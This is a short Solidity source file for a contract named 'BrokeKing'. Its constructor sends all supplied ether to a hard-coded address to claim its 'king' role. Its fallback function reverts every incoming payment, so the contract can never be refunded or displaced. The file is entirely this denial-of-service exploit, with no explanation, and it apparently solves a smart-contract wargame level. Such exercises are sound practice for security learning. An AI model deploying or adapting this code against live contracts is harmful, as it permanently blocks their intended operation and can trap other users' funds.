// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract BrokeKing {
    address public king = 0xf2d90870b311e44B982FCEFB5716d9f9F2035f8E;

    function BrokeKing() public payable {
        king.call.value(msg.value)();
    }

    function() external payable {
        revert();
    }
}